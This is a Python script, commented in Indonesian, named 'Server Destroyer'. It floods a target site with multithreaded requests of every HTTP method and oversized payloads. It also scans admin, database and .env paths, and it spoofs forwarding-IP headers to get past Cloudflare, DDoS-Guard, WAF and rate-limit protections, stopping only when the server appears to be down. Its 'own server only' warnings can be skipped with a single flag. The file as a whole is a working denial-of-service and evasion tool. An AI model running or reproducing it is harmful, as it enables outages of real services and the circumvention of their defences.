#!/usr/bin/env python3
"""
💥 SERVER DESTROYER TOOL 💥
AGGRESSIVE STRESS TESTING DENGAN KOMBINASI HTTP METHODS

⚠️ PERINGATAN: HANYA UNTUK TESTING SERVER YANG ANDA MILIKI! ⚠️
⚠️ TOOL INI SANGAT AGRESIF DAN BISA MEMBUAT SERVER DOWN! ⚠️
"""

import requests
import time
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import argparse
from bs4 import BeautifulSoup
import json
import hashlib
import base64
import socket
import struct

class ServerDestroyer:
    """Tool untuk aggressive server stress testing dengan kombinasi HTTP methods"""
    
    def __init__(self, target_url, max_workers=50):
        self.target_url = target_url
        self.max_workers = max_workers
        self.session = requests.Session()
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.bypass_count = 0
        self.start_time = time.time()
        self.running = True
        self.interesting_finds = []
        self.server_down = False
        
        # Setup session
        self._setup_session()
        
        # Advanced paths untuk testing
        self.advanced_paths = self._generate_advanced_paths()
        
        # HTTP Methods untuk kombinasi
        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE']
        
        # Payloads untuk POST/PUT requests
        self.payloads = self._generate_payloads()
        
        # Bypass methods
        self.bypass_methods = {
            'ddos_guard': self._bypass_ddos_guard,
            'cloudflare': self._bypass_cloudflare,
            'waf': self._bypass_waf,
            'rate_limit': self._bypass_rate_limit,
            'geo_block': self._bypass_geo_block,
            'device_block': self._bypass_device_block
        }
    
    def _setup_session(self):
        """Setup session dengan ultra-aggressive headers"""
        # Extended User Agents
        user_agents = [
            # Modern browsers
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            
            # Mobile devices
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # Legacy browsers
            'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
            
            # Bots
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            
            # Tools
            'curl/7.88.1',
            'Wget/1.21.4',
            'python-requests/2.31.0',
            'Apache-HttpClient/4.5.13',
            'okhttp/4.9.3',
            'PostmanRuntime/7.28.4',
        ]
        
        # Ultra-aggressive headers
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Forwarded-For': self._generate_random_ip(),
            'X-Real-IP': self._generate_random_ip(),
            'CF-Connecting-IP': self._generate_random_ip(),
            'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']),
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Host': urlparse(self.target_url).netloc,
            'X-Forwarded-Port': '443',
            'X-Original-URL': '/',
            'X-Rewrite-URL': '/',
            'X-Custom-IP-Authorization': self._generate_random_ip(),
            'X-Forwarded-Server': 'proxy.example.com',
            'X-Forwarded-By': 'proxy.example.com',
            'X-Forwarded-For-Original': self._generate_random_ip(),
            'X-Client-IP': self._generate_random_ip(),
            'X-Remote-IP': self._generate_random_ip(),
            'X-Remote-Addr': self._generate_random_ip(),
            'X-ProxyUser-Ip': self._generate_random_ip(),
            'X-Proxy-Connection': 'keep-alive',
            'X-Proxy-Authenticate': 'Basic realm="Proxy Authentication Required"',
            'X-Proxy-Authorization': 'Basic ' + base64.b64encode(b'user:pass').decode(),
            'X-Proxy-User': 'admin',
            'X-Proxy-Pass': 'password',
            'X-Proxy-Forwarded-For': self._generate_random_ip(),
            'X-Proxy-Real-IP': self._generate_random_ip(),
            'X-Proxy-Client-IP': self._generate_random_ip(),
            'X-Proxy-Remote-IP': self._generate_random_ip(),
            'X-Proxy-Remote-Addr': self._generate_random_ip(),
            'X-Proxy-User-Ip': self._generate_random_ip(),
            'X-Proxy-Connection': 'keep-alive',
            'X-Proxy-Authenticate': 'Basic realm="Proxy Authentication Required"',
            'X-Proxy-Authorization': 'Basic ' + base64.b64encode(b'user:pass').decode(),
            'X-Proxy-User': 'admin',
            'X-Proxy-Pass': 'password',
        })
        
        # Setup ultra-aggressive retry strategy
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        retry_strategy = Retry(
            total=10,
            backoff_factor=0.1,
            status_forcelist=[429, 500, 502, 503, 504, 403, 407, 408, 520, 521, 522, 523, 524, 525, 526, 527, 530],
            allowed_methods=["HEAD", "GET", "OPTIONS", "POST", "PUT", "DELETE", "PATCH", "TRACE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=200, pool_maxsize=200)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def _generate_random_ip(self):
        """Generate random IP address"""
        return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    
    def _generate_payloads(self):
        """Generate payloads untuk POST/PUT requests"""
        payloads = []
        
        # JSON payloads
        json_payloads = [
            {'data': 'A' * 1000},
            {'data': 'A' * 10000},
            {'data': 'A' * 100000},
            {'data': 'A' * 1000000},
            {'test': 'payload', 'size': 'large'},
            {'admin': True, 'user': 'admin', 'password': 'admin'},
            {'debug': True, 'verbose': True, 'trace': True},
            {'query': 'SELECT * FROM users', 'type': 'sql'},
            {'command': 'system', 'args': ['ls', '-la']},
            {'eval': 'console.log("test")', 'type': 'javascript'},
        ]
        
        # Form data payloads
        form_payloads = [
            {'username': 'admin', 'password': 'admin'},
            {'email': 'test@test.com', 'password': 'password'},
            {'data': 'A' * 1000},
            {'file': 'A' * 10000},
            {'query': 'SELECT * FROM users'},
            {'command': 'system'},
            {'eval': 'console.log("test")'},
        ]
        
        # Raw payloads
        raw_payloads = [
            'A' * 1000,
            'A' * 10000,
            'A' * 100000,
            'A' * 1000000,
            'SELECT * FROM users',
            'system("ls -la")',
            'console.log("test")',
            'eval("console.log(\'test\')")',
            'document.cookie',
            'localStorage.getItem("token")',
            'sessionStorage.getItem("user")',
            'XMLHttpRequest',
            'fetch("/api/users")',
            '$.ajax({url: "/api/users"})',
            'axios.get("/api/users")',
        ]
        
        payloads.extend(json_payloads)
        payloads.extend(form_payloads)
        payloads.extend(raw_payloads)
        
        return payloads
    
    def _generate_advanced_paths(self):
        """Generate advanced paths untuk testing"""
        paths = []
        
        # Admin paths dengan variations
        admin_paths = [
            '/admin', '/admin/', '/administrator', '/admin.php', '/admin.html',
            '/wp-admin', '/wp-admin/', '/wp-login.php', '/wp-admin/admin-ajax.php',
            '/admin/login', '/admin/dashboard', '/admin/users', '/admin/settings',
            '/admin/index.php', '/admin/index.html', '/admin/default.asp',
            '/admin/admin.asp', '/admin/admin.php', '/admin/admin.html',
            '/admin/administrator.php', '/admin/administrator.html',
            '/admin/admin_login.php', '/admin/admin_login.html',
            '/admin/admin_login.asp', '/admin/admin_login.aspx',
            '/admin/admin_login.jsp', '/admin/admin_login.cfm',
            '/admin/admin_login.pl', '/admin/admin_login.py',
            '/admin/admin_login.rb', '/admin/admin_login.cs',
            '/admin/admin_login.java', '/admin/admin_login.php3',
            '/admin/admin_login.php4', '/admin/admin_login.php5',
            '/admin/admin_login.phtml', '/admin/admin_login.shtml',
            '/admin/admin_login.stm', '/admin/admin_login.shtm',
            '/admin/admin_login.shtml', '/admin/admin_login.stm',
            '/admin/admin_login.shtm', '/admin/admin_login.shtml',
        ]
        
        # API paths dengan variations
        api_paths = [
            '/api', '/api/', '/api/v1', '/api/v2', '/api/v3', '/api/users', '/api/data',
            '/rest', '/rest/', '/rest/v1', '/rest/v2', '/rest/users', '/rest/data',
            '/graphql', '/graphql/', '/swagger', '/swagger/', '/swagger-ui', '/swagger-ui/',
            '/openapi', '/openapi/', '/openapi.json', '/openapi.yaml', '/openapi.yml',
            '/docs', '/docs/', '/documentation', '/documentation/', '/api-docs', '/api-docs/',
            '/redoc', '/redoc/', '/rapidoc', '/rapidoc/', '/postman', '/postman/',
            '/insomnia', '/insomnia/', '/api/health', '/api/status', '/api/ping',
            '/api/version', '/api/info', '/api/config', '/api/settings',
        ]
        
        # Database paths
        db_paths = [
            '/phpmyadmin', '/phpmyadmin/', '/mysql', '/mysql/', '/db', '/db/',
            '/database', '/database/', '/sql', '/sql/', '/myadmin', '/myadmin/',
            '/phpMyAdmin', '/phpMyAdmin/', '/pma', '/pma/', '/mysqladmin', '/mysqladmin/',
            '/dbadmin', '/dbadmin/', '/webdb', '/webdb/', '/websql', '/websql/',
            '/web-sql', '/web-sql/', '/websqlphp', '/websqlphp/', '/php-myadmin', '/php-myadmin/',
            '/phpmy-admin', '/phpmy-admin/', '/phpMyAdmin2', '/phpMyAdmin2/',
            '/phpMyAdmin-2', '/phpMyAdmin-2/', '/phpMyAdmin-3', '/phpMyAdmin-3/',
            '/phpMyAdmin-4', '/phpMyAdmin-4/', '/phpMyAdmin-5', '/phpMyAdmin-5/',
        ]
        
        # File paths dengan variations
        file_paths = [
            '/files', '/files/', '/uploads', '/uploads/', '/images', '/images/',
            '/static', '/static/', '/assets', '/assets/', '/media', '/media/',
            '/public', '/public/', '/downloads', '/downloads/', '/documents', '/documents/',
            '/backup', '/backup/', '/backups', '/backups/', '/bak', '/bak/',
            '/old', '/old/', '/archive', '/archive/', '/temp', '/temp/',
            '/tmp', '/tmp/', '/cache', '/cache/', '/var', '/var/',
            '/logs', '/logs/', '/log', '/log/', '/error.log', '/access.log',
            '/debug.log', '/system.log', '/app.log', '/web.log',
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            '/config.php', '/config.json', '/config.xml', '/settings.php',
            '/web.config', '/.htaccess', '/robots.txt', '/sitemap.xml',
        ]
        
        # CMS paths
        cms_paths = [
            '/wp-content', '/wp-content/', '/wp-includes', '/wp-includes/',
            '/joomla', '/joomla/', '/drupal', '/drupal/', '/magento', '/magento/',
            '/wordpress', '/wordpress/', '/wp', '/wp/', '/wp-admin', '/wp-admin/',
            '/wp-login.php', '/wp-login.php', '/wp-admin/admin-ajax.php',
            '/wp-admin/admin-post.php', '/wp-admin/admin-functions.php',
            '/wp-admin/admin-header.php', '/wp-admin/admin-footer.php',
            '/wp-admin/admin.php', '/wp-admin/admin.html', '/wp-admin/admin.asp',
            '/wp-admin/admin.aspx', '/wp-admin/admin.jsp', '/wp-admin/admin.cfm',
            '/wp-admin/admin.pl', '/wp-admin/admin.py', '/wp-admin/admin.rb',
            '/wp-admin/admin.cs', '/wp-admin/admin.java', '/wp-admin/admin.php3',
            '/wp-admin/admin.php4', '/wp-admin/admin.php5', '/wp-admin/admin.phtml',
            '/wp-admin/admin.shtml', '/wp-admin/admin.stm', '/wp-admin/admin.shtm',
        ]
        
        # Framework paths
        framework_paths = [
            '/laravel', '/laravel/', '/symfony', '/symfony/', '/django', '/django/',
            '/rails', '/rails/', '/spring', '/spring/', '/express', '/express/',
            '/flask', '/flask/', '/fastapi', '/fastapi/', '/gin', '/gin/',
            '/echo', '/echo/', '/fiber', '/fiber/', '/chi', '/chi/',
            '/mux', '/mux/', '/gorilla', '/gorilla/', '/iris', '/iris/',
            '/revel', '/revel/', '/beego', '/beego/', '/martini', '/martini/',
            '/negroni', '/negroni/', '/buffalo', '/buffalo/', '/cayley', '/cayley/',
        ]
        
        # Testing paths
        testing_paths = [
            '/test', '/test/', '/testing', '/testing/', '/dev', '/dev/',
            '/development', '/development/', '/staging', '/staging/',
            '/beta', '/beta/', '/alpha', '/alpha/', '/preview', '/preview/',
            '/demo', '/demo/', '/sandbox', '/sandbox/', '/playground', '/playground/',
            '/debug', '/debug/', '/debugger', '/debugger/', '/trace', '/trace/',
            '/profile', '/profile/', '/profiler', '/profiler/', '/monitor', '/monitor/',
            '/health', '/health/', '/status', '/status/', '/ping', '/ping/',
            '/pong', '/pong/', '/echo', '/echo/', '/info', '/info/',
        ]
        
        # Error pages
        error_paths = [
            '/404', '/404.html', '/500', '/500.html', '/error', '/error/',
            '/maintenance', '/maintenance/', '/under-construction', '/under-construction/',
            '/coming-soon', '/coming-soon/', '/not-found', '/not-found/',
            '/forbidden', '/forbidden/', '/unauthorized', '/unauthorized/',
            '/bad-request', '/bad-request/', '/internal-server-error', '/internal-server-error/',
            '/service-unavailable', '/service-unavailable/', '/gateway-timeout', '/gateway-timeout/',
        ]
        
        # Search paths
        search_paths = [
            '/search', '/search/', '/find', '/find/', '/query', '/query/',
            '/lookup', '/lookup/', '/browse', '/browse/', '/explore', '/explore/',
            '/discover', '/discover/', '/explorer', '/explorer/', '/navigator', '/navigator/',
            '/directory', '/directory/', '/index', '/index/', '/catalog', '/catalog/',
            '/listing', '/listing/', '/list', '/list/', '/items', '/items/',
            '/products', '/products/', '/services', '/services/', '/resources', '/resources/',
        ]
        
        # User paths
        user_paths = [
            '/user', '/user/', '/users', '/users/', '/profile', '/profile/',
            '/account', '/account/', '/login', '/login/', '/register', '/register/',
            '/signup', '/signup/', '/signin', '/signin/', '/logout', '/logout/',
            '/auth', '/auth/', '/authentication', '/authentication/', '/authorization', '/authorization/',
            '/session', '/session/', '/sessions', '/sessions/', '/token', '/token/',
            '/oauth', '/oauth/', '/oauth2', '/oauth2/', '/openid', '/openid/',
            '/saml', '/saml/', '/cas', '/cas/', '/ldap', '/ldap/',
        ]
        
        # System paths
        system_paths = [
            '/system', '/system/', '/sys', '/sys/', '/core', '/core/',
            '/kernel', '/kernel/', '/boot', '/boot/', '/init', '/init/',
            '/startup', '/startup/', '/shutdown', '/shutdown/', '/restart', '/restart/',
            '/reload', '/reload/', '/refresh', '/refresh/', '/reset', '/reset/',
            '/clear', '/clear/', '/flush', '/flush/', '/purge', '/purge/',
            '/clean', '/clean/', '/cleanup', '/cleanup/', '/maintenance', '/maintenance/',
        ]
        
        # Combine all paths
        paths.extend(admin_paths)
        paths.extend(api_paths)
        paths.extend(db_paths)
        paths.extend(file_paths)
        paths.extend(cms_paths)
        paths.extend(framework_paths)
        paths.extend(testing_paths)
        paths.extend(error_paths)
        paths.extend(search_paths)
        paths.extend(user_paths)
        paths.extend(system_paths)
        
        return paths
    
    def _bypass_ddos_guard(self, response):
        """Bypass DDoS Guard protection"""
        try:
            if 'ddos-guard' in response.text.lower():
                print("🔄 DDoS Guard detected, attempting bypass...")
                
                # Parse challenge script
                soup = BeautifulSoup(response.text, 'html.parser')
                scripts = soup.find_all('script')
                
                for script in scripts:
                    if script.string and 'ddg' in script.string.lower():
                        print("📜 Challenge script found")
                        break
                
                # Simulate solving challenge
                time.sleep(1)
                
                # Retry with cookies
                response = self.session.get(response.url, timeout=5)
                self.bypass_count += 1
                
                return response
        except Exception as e:
            print(f"❌ DDoS Guard bypass failed: {str(e)}")
        
        return response
    
    def _bypass_cloudflare(self, response):
        """Bypass Cloudflare protection"""
        try:
            if 'cloudflare' in response.text.lower() or 'cf-ray' in str(response.headers):
                print("🔄 Cloudflare detected, attempting bypass...")
                
                if 'checking your browser' in response.text.lower():
                    print("⏳ Waiting for Cloudflare challenge...")
                    time.sleep(2)
                
                # Retry with different headers
                self.session.headers.update({
                    'CF-IPCountry': 'US',
                    'CF-Connecting-IP': self._generate_random_ip(),
                    'X-Forwarded-For': self._generate_random_ip(),
                })
                
                response = self.session.get(response.url, timeout=5)
                self.bypass_count += 1
                
                return response
        except Exception as e:
            print(f"❌ Cloudflare bypass failed: {str(e)}")
        
        return response
    
    def _bypass_waf(self, response):
        """Bypass WAF protection"""
        try:
            if response.status_code in [403, 407]:
                print("🔄 WAF detected, attempting bypass...")
                
                # Rotate User Agent
                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ]
                
                self.session.headers['User-Agent'] = random.choice(user_agents)
                self.session.headers.update({
                    'X-Forwarded-For': self._generate_random_ip(),
                    'X-Real-IP': self._generate_random_ip(),
                })
                
                response = self.session.get(response.url, timeout=5)
                self.bypass_count += 1
                
                return response
        except Exception as e:
            print(f"❌ WAF bypass failed: {str(e)}")
        
        return response
    
    def _bypass_rate_limit(self, response):
        """Bypass rate limiting"""
        try:
            if response.status_code == 429:
                print("🔄 Rate limit detected, attempting bypass...")
                
                # Wait and retry with different IP
                time.sleep(random.uniform(0.5, 1))
                self.session.headers.update({
                    'X-Forwarded-For': self._generate_random_ip(),
                    'X-Real-IP': self._generate_random_ip(),
                    'CF-Connecting-IP': self._generate_random_ip(),
                })
                
                response = self.session.get(response.url, timeout=5)
                self.bypass_count += 1
                
                return response
        except Exception as e:
            print(f"❌ Rate limit bypass failed: {str(e)}")
        
        return response
    
    def _bypass_geo_block(self, response):
        """Bypass geo-blocking"""
        try:
            if any(keyword in response.text.lower() for keyword in ['not available in your country', 'geo-blocked', 'region restricted']):
                print("🔄 Geo-blocking detected, attempting bypass...")
                
                self.session.headers.update({
                    'Accept-Language': 'en-US,en;q=0.9',
                    'CF-IPCountry': 'US',
                    'X-Forwarded-For': '8.8.8.8',
                    'X-Real-IP': '8.8.8.8',
                })
                
                response = self.session.get(response.url, timeout=5)
                self.bypass_count += 1
                
                return response
        except Exception as e:
            print(f"❌ Geo-blocking bypass failed: {str(e)}")
        
        return response
    
    def _bypass_device_block(self, response):
        """Bypass device blocking"""
        try:
            if any(keyword in response.text.lower() for keyword in ['device not supported', 'mobile only', 'desktop only']):
                print("🔄 Device blocking detected, attempting bypass...")
                
                device_headers = [
                    {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                    },
                    {
                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    }
                ]
                
                self.session.headers.update(random.choice(device_headers))
                response = self.session.get(response.url, timeout=5)
                self.bypass_count += 1
                
                return response
        except Exception as e:
            print(f"❌ Device blocking bypass failed: {str(e)}")
        
        return response
    
    def test_path_with_methods(self, path):
        """Test single path dengan multiple HTTP methods"""
        if not self.running:
            return None
            
        try:
            url = urljoin(self.target_url, path)
            
            # Randomize headers
            self.session.headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            ])
            
            self.session.headers['X-Forwarded-For'] = self._generate_random_ip()
            
            results = []
            
            # Test dengan multiple HTTP methods
            for method in self.http_methods:
                if not self.running:
                    break
                    
                try:
                    if method in ['GET', 'HEAD', 'OPTIONS', 'TRACE']:
                        response = self.session.request(method, url, timeout=5, allow_redirects=True)
                    else:
                        # POST, PUT, DELETE, PATCH dengan payload
                        payload = random.choice(self.payloads)
                        if isinstance(payload, dict):
                            response = self.session.request(method, url, json=payload, timeout=5, allow_redirects=True)
                        else:
                            response = self.session.request(method, url, data=payload, timeout=5, allow_redirects=True)
                    
                    self.request_count += 1
                    
                    # Apply bypass methods if needed
                    original_status = response.status_code
                    
                    # Try bypass methods
                    for method_name, bypass_method in self.bypass_methods.items():
                        if not self.running:
                            break
                        response = bypass_method(response)
                        if response.status_code != original_status:
                            break
                    
                    # Analyze response
                    status = response.status_code
                    content_length = len(response.content)
                    
                    if status == 200:
                        self.success_count += 1
                        print(f"✅ [{self.request_count}] {method} {path} - Status: {status} - Size: {content_length}")
                        
                        # Check for interesting content
                        sensitive_keywords = ['admin', 'login', 'password', 'database', 'config', 'secret', 'key', 'token', 'api', 'debug']
                        if any(keyword in response.text.lower() for keyword in sensitive_keywords):
                            print(f"🔍 INTERESTING: {method} {path} contains sensitive keywords!")
                            self.interesting_finds.append({
                                'method': method,
                                'path': path,
                                'url': url,
                                'status': status,
                                'size': content_length,
                                'keywords': [kw for kw in sensitive_keywords if kw in response.text.lower()]
                            })
                            
                    elif status in [403, 404, 500, 502, 503, 520, 521, 522, 523, 524]:
                        self.failed_count += 1
                        print(f"❌ [{self.request_count}] {method} {path} - Status: {status} - Size: {content_length}")
                        
                        # Check if server is down
                        if status in [502, 503, 520, 521, 522, 523, 524]:
                            print(f"💥 SERVER DOWN DETECTED: {method} {path} - Status: {status}")
                            self.server_down = True
                        
                    else:
                        print(f"⚠️ [{self.request_count}] {method} {path} - Status: {status} - Size: {content_length}")
                    
                    results.append({
                        'method': method,
                        'path': path,
                        'url': url,
                        'status': status,
                        'size': content_length,
                        'headers': dict(response.headers),
                        'cookies': dict(response.cookies)
                    })
                    
                except Exception as e:
                    self.failed_count += 1
                    print(f"💥 [{self.request_count}] {method} {path} - Error: {str(e)}")
                    
                    # Check if server is down
                    if 'Connection refused' in str(e) or 'timeout' in str(e).lower():
                        print(f"💥 SERVER DOWN DETECTED: {method} {path} - Connection Error")
                        self.server_down = True
            
            return results
            
        except Exception as e:
            self.failed_count += 1
            print(f"💥 [{self.request_count}] {path} - Error: {str(e)}")
            return None
    
    def generate_random_paths(self, count=300):
        """Generate random paths untuk testing"""
        paths = []
        
        # Common patterns
        patterns = [
            '/{word}{num}',
            '/{word}_{num}',
            '/{word}-{num}',
            '/{num}{word}',
            '/{word}/{num}',
            '/{num}/{word}',
            '/{word}/{word2}{num}',
            '/{word}{num}/{word2}',
            '/{word}/{word2}/{num}',
            '/{num}/{word}/{word2}',
        ]
        
        words = ['test', 'api', 'admin', 'user', 'data', 'file', 'config', 'backup', 'log', 'temp', 'cache', 'dev', 'prod', 'staging', 'beta', 'alpha', 'debug', 'info', 'status', 'health', 'ping', 'echo', 'demo', 'sample', 'example', 'template', 'default', 'index', 'main', 'core', 'base', 'root']
        
        for i in range(count):
            pattern = random.choice(patterns)
            word = random.choice(words)
            word2 = random.choice(words)
            num = random.randint(1, 9999)
            
            try:
                path = pattern.format(word=word, word2=word2, num=num)
                paths.append(path)
            except:
                path = f'/{word}{num}'
                paths.append(path)
        
        return paths
    
    def start_server_destroyer(self):
        """Mulai server destroyer dengan kombinasi HTTP methods"""
        print(f"💥 Memulai SERVER DESTROYER pada: {self.target_url}")
        print(f"⚡ Max Workers: {self.max_workers}")
        print(f"🛡️ Bypass Methods: {len(self.bypass_methods)}")
        print(f"🌐 HTTP Methods: {', '.join(self.http_methods)}")
        print(f"⏰ Tanpa batas waktu - Tekan Ctrl+C untuk stop")
        print("=" * 80)
        
        all_paths = self.advanced_paths.copy()
        
        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                while self.running and not self.server_down:
                    # Generate more random paths
                    random_paths = self.generate_random_paths(100)
                    current_paths = all_paths + random_paths
                    
                    # Submit tasks
                    futures = []
                    for path in current_paths:
                        if not self.running or self.server_down:
                            break
                        future = executor.submit(self.test_path_with_methods, path)
                        futures.append(future)
                    
                    # Wait for completion
                    for future in as_completed(futures):
                        if not self.running or self.server_down:
                            break
                        result = future.result()
                        
                        # Print stats setiap 50 requests
                        if self.request_count % 50 == 0:
                            self.print_destroyer_stats()
                        
                        # Check if server is down
                        if self.server_down:
                            print("💥 SERVER DOWN CONFIRMED! Mission accomplished!")
                            break
                    
                    # Small delay untuk menghindari rate limiting
                    time.sleep(0.01)
                    
        except KeyboardInterrupt:
            print("\n⏹️ Server destroyer dihentikan oleh user")
            self.running = False
        except Exception as e:
            print(f"❌ Error: {str(e)}")
            self.running = False
    
    def print_destroyer_stats(self):
        """Print destroyer statistics"""
        elapsed_time = time.time() - self.start_time
        requests_per_second = self.request_count / elapsed_time if elapsed_time > 0 else 0
        
        print(f"\n💥 SERVER DESTROYER STATS")
        print(f"🔄 Requests: {self.request_count} | Success: {self.success_count} | Failed: {self.failed_count}")
        print(f"🛡️ Bypass Attempts: {self.bypass_count} | RPS: {requests_per_second:.2f}")
        print(f"🔍 Interesting Finds: {len(self.interesting_finds)}")
        print(f"💥 Server Down: {self.server_down}")
        print(f"⏱️ Elapsed: {elapsed_time:.1f}s | Running: {self.running}")
        print("-" * 80)
        
        # Show interesting finds
        if self.interesting_finds:
            print("🔍 INTERESTING FINDS:")
            for find in self.interesting_finds[-5:]:  # Show last 5
                print(f"  📁 {find['method']} {find['path']} - Keywords: {find['keywords']}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='💥 SERVER DESTROYER TOOL 💥')
    parser.add_argument('url', help='Target URL (HANYA SERVER YANG ANDA MILIKI!)')
    parser.add_argument('--workers', type=int, default=50, help='Number of workers (default: 50)')
    parser.add_argument('--confirm', action='store_true', help='Confirm that you own this server')
    
    args = parser.parse_args()
    
    # Safety check
    if not args.confirm:
        print("⚠️  PERINGATAN KEAMANAN KRITIS ⚠️")
        print("=" * 60)
        print("Tool ini SANGAT AGRESIF dan bisa MEMBUAT SERVER DOWN!")
        print("HANYA gunakan pada server yang ANDA MILIKI!")
        print("JANGAN GUNAKAN pada website orang lain!")
        print("Ini bisa dianggap sebagai serangan DDoS!")
        print("=" * 60)
        print(f"Target: {args.url}")
        print("=" * 60)
        
        confirm = input("Apakah Anda yakin server ini MILIK ANDA? (yes/no): ")
        if confirm.lower() != 'yes':
            print("❌ Server destroyer dibatalkan")
            return
        
        confirm2 = input("Apakah Anda yakin ingin membuat server DOWN? (yes/no): ")
        if confirm2.lower() != 'yes':
            print("❌ Server destroyer dibatalkan")
            return
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url
    
    # Start destroyer
    destroyer = ServerDestroyer(args.url, args.workers)
    
    try:
        destroyer.start_server_destroyer()
    except KeyboardInterrupt:
        print("\n⏹️ Server destroyer dihentikan")
    finally:
        destroyer.running = False
        destroyer.print_destroyer_stats()
        print("\n🏁 Server destroyer selesai")

if __name__ == "__main__":
    main() 
